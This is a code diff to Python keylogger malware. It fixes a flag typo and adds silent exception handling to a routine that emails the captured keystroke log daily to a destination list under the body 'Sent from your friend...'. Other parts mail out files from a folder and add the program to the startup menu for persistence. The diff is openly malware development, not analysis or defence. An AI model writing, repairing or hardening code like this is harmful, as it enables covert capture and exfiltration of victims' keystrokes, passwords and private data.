@@ -83,13 +83,17 @@ class KeyLogger(object):
         self.log_controller.writeMessage("Confirmation of Keylogger termination\n")
 
     def send_keylog(self):
-        while send_keylog_flog is True:
+        while self.send_keylog_flag is True:
             time.sleep(86400)
-            email_controller = AttachMail()
-            email_controller.start_server()
-            email_controller.sendMail(Constants.EMAIL_DESTINATION_LIST, "KeyLog File Attached",
-                                      "Sent from your friend...", Constants.KEY_STROKES_LOG)
-            email_controller.stop_server()
+            try:
+                email_controller = AttachMail()
+                email_controller.start_server()
+                email_controller.sendMail(Constants.EMAIL_DESTINATION_LIST, "KeyLog File Attached",
+                                          "Sent from your friend...", Constants.KEY_STROKES_LOG)
+                email_controller.stop_server()
+
+            except:
+                pass
 
     def stop_to_send_keylog(self):
         time.sleep(2592000) #Wait for a month
@@ -355,6 +359,7 @@ class AttachMail():
 
     def stop_server(self):
         self.mailServer.close()
+
     def sendMail(self, to, subject, text, attach):
         msg = MIMEMultipart()
   
@@ -371,6 +376,7 @@ class AttachMail():
                 'attachment; filename="%s"' % os.path.basename(attach))
         msg.attach(part)
         self.mailServer.sendmail(Constants.EMAIL_LOGIN, to, msg.as_string())
+
     def sendMailInFolder(self):
         while True:
             time.sleep(86400)
@@ -384,7 +390,7 @@ class AttachMail():
                     self.sendMail(Constants.EMAIL_DESTINATION_LIST,"python","python",temp)
             self.stop_server()
 
-
+# Wasn't working out for us
 def add_self_to_startup():
     # Check if program is in startup
     # If not, add it
@@ -408,8 +414,6 @@ def add_self_to_startup():
         log_controller.writeMessage("Added shortcut to startup menu")
     else:
         log_controller.writeMessage("Shortcut ALREADY to startup menu")
-
-
 
 
 def kickOff():
